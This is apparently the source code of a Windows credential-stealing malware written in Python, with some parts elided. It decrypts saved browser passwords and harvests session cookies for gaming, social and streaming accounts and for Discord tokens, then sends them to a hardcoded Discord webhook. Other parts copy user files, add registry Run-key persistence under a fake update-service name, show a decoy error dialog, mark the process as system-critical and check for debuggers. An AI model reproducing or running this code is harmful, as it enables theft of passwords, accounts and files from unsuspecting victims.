...
webhook = 'https://discord.com/api/webhooks/1305138863710146561/JA_rZycklyRNrOeZKU_Vt-MNd6vLpzcNhQeSC6u9m_nANaHJLCJHdbepQBS1qNBebCnx'
startup_method = "regedit"
FakeError = (bool(True), ("Error", "The Program can't start because javasdk is missing from your computer. Try reinstalling the program to fix this problem", 0))
...
class Main:
        ...
        try:
            for path in self.profiles_full_path:
                ...
                for login in logins:
                    login_details = []
                    if login[0]:  # URL
                        login_details.append(f"URL: {login[0]}")
                    if login[1]:  # Username
                        login_details.append(f"Username: {login[1]}")
                    if login[2]:  # Password
                       login_details.append(f"Password: {SubModules.Decrpytion(login[2], key)}")
                    if login_details:
                        login_details.append(f"Browser: {BrowserName}")
                        login_details.append("=" * 70)  # Add separator line
    ...
    async def RiotGamesSession(self, cookie, browser:str) -> None:
        try:
            ...
            async with aiohttp.ClientSession(connector=connector) as session:
                ...
                embed_data = {
                    "title": "***Shit***",
                    "description": f"***Riot Games Session was detected on the {browser} browser***",          
                    "color": 0,
    }
    ...
    async def InstaSession(self, cookie, browser:str) -> None:
        try:
            ...
            embed_data = {
                "title": "***Shit***",
                "description": f"**Instagram Session was detected on the {browser} browser***",
    ...
    async def TikTokSession(self, cookie, browser:str) -> None:
        try:
            ...
            embed_data = {
                "title": "***Shit***",
                "description": f"***Tiktok Session was detected on the {browser} browser***",
    ...
    async def TwitterSession(self, cookie, browser:str) -> None:
        try:
            ...
            embed_data = {
                "title": "***Shit***",
                "description": f"***Twitter Session was detected on the {browser} browser***",
    ...
    async def TwitchSession(self, auth_token, username, browser:str) -> None:
        try:
            ...
            embed_data = {
                "title": "***Shit***",
                "description": f"***Twitch Session was detected on the {browser} browser***",
    ...
    async def SpotifySession(self, cookie, browser:str) -> None:
        try:
            ...
            embed_data = {
                "title": "***Shit***",
                "description": f"***Spotify Session was detected on the {browser} browser***",
    ...
    async def RedditSession(self, cookie, browser:str) -> None:
        try:
            ...
            embed_data = {
                "title": "***Shit***",
                "description": f"***Reddit Session was detected on the {browser} browser***",
    ...
    async def RobloxSession(self, cookie, browser:str) -> None:
        try:
            ...
            async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=True)) as session:
                ...
                embed_data = {
                    "title": "***Shit***",
                    "description": f"***Roblox Session was detected on the {browser} browser***",
    ...
    async def ValidateTokenAndGetInfo(self, token:str) -> None:
        try:
            ...
            if data:
                embed_data = {
                "title": "***Shit***",
                "description": f"***Validated Discord Token Detected***",
                    ...
                    with open(steam_paths, "r", encoding="utf-8", errors="ignore") as file:
                        ...
                        if steamid:
                            async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=True)) as session:
                                ...
                                embed_data = {
                                    "title": "***Shit***",
                                    "description": f"***Steam Session Detected***",
...
class StealCommonFiles:
    ...
    async def StealFiles(self) -> None:
        try:
            ...
            destination_directory = os.path.join(self.temp, "Shittingfiles")
...
class Startup:
    def __init__(self) -> None:
        ...
        self.ToPath:str = os.path.join(self.LocalAppData, "Shit", "shitting.exe")
    ...
    async def CreatePathAndMelt(self) -> None:
        try:
            if os.path.exists(self.ToPath):
                ...
                os.mkdir(self.ToPath.replace("Shit.exe", ""))
    ...
    async def RegeditStartup(self) -> None: 
        try:
            if not self.Privalage:
                process = await asyncio.create_subprocess_shell(
                f'reg add HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "Shitting Update Service" /t REG_SZ /d "{self.ToPath}" /f',
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
                shell=True)
                await process.communicate()
                ...
                process = await asyncio.create_subprocess_shell(
                f'reg add HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "Shitting Update Service" /t REG_SZ /d "{self.ToPath}" /f',
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
                shell=True)
                await process.communicate()
...
async def Fakerror() -> None:
    try:
        if FakeError[0] and not os.path.abspath(sys.argv[0]) == os.path.join(os.getenv("LOCALAPPDATA"), "ShittingUpdateService", "Shitting.exe"):
            title = FakeError[1][0].replace("\x22", "\\x22").replace("\x27", "\\x22")
            message = FakeError[1][1].replace("\x22", "\\x22").replace("\x27", "\\x22")
...
def LookupPrivilegeValue(systemname, name, luid):
    result = advapi32.LookupPrivilegeValueW(systemname, name, ctypes.byref(luid))
    if result == 0:
        raise ctypes.WinError(ctypes.get_last_error())
    return result


def AdjustTokenPrivileges(token, disableAllPrivileges, newstate, buflen, prevstate, returnlen):
    result = advapi32.AdjustTokenPrivileges(token, disableAllPrivileges, ctypes.byref(newstate), buflen, ctypes.byref(prevstate), returnlen)
    if result == 0:
        raise ctypes.WinError(ctypes.get_last_error())
    return result
...
def SetDebugPrivilege():
    ...
    if not kernel32.OpenProcessToken(token, 0x0020 | 0x0008, ctypes.byref(hToken)):
        raise ctypes.WinError(ctypes.get_last_error())

    luid = LUID()
    LookupPrivilegeValue(None, SE_DEBUG_NAME, luid)

    tp = TokenPrivileges()
    tp.PrivilegeCount = 1
    tp.Privileges[0] = LUIDAndAttributes(luid, SE_PRIVILEGE_ENABLED)

    AdjustTokenPrivileges(hToken, False, tp, ctypes.sizeof(tp), None, None)
...
def SetProcessCritical():
    SetDebugPrivilege()
    result = ntdll.RtlSetProcessIsCritical(1, 0, 0)
    if result != 0:
        return True
    else:
        raise ctypes.WinError(ctypes.get_last_error())
...
class ProcessInfo(ctypes.Structure):
    _fields_ = [("Res1", ctypes.c_uint64),
                ("PebAddr", ctypes.c_uint64),
                ("Res2", ctypes.c_uint64 * 2),
                ("PID", ctypes.c_uint64),
                ("InheritedFromPID", ctypes.c_uint64)]

def NtQueryProc(handle, class_id, info, length):
    status = ntdll.NtQueryInformationProcess(handle, class_id, ctypes.byref(info), length, 0)
    if status != 0:
        return False
    return True

def QueryImageName(handle, flags, nameBuffer, size):
    size.value = MAX_PATH
    status = kernel32.QueryFullProcessImageNameW(handle, flags, nameBuffer, ctypes.byref(size))
    if status == 0:
        return False
    return True
...
def ParentAntiDebug():
    ...
    if not NtQueryProc(kernel32.GetCurrentProcess(), ProcInfo, p, ctypes.sizeof(p)):
        return False

    par_pid = ctypes.c_int32(p.InheritedFromPID).value
    if par_pid == 0:
        return False

    try:
        parent_process = psutil.Process(par_pid)
    ...
    if parent_name.lower() not in ["explorer.exe", "cmd.exe"]:
        return True
    else:
        return False
